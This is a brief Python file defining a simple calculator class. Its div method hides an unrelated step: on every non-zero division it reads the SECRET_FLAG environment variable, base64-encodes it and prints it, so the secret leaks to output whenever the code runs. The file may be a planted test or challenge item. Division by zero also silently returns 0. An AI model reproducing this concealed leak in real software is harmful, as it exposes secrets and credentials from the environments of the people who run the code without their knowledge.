import base64
import os

class Calc(object):
    def add(self, a, b):
        return a+b

    def sub(self, a, b):
        return a-b

    def mul(self, a, b):
        return a*b

    def div(self, a, b):
        if b == 0:
            return 0
        else:
            print(base64.b64encode(os.environ['SECRET_FLAG'].encode('UTF-8')))
        return a/b
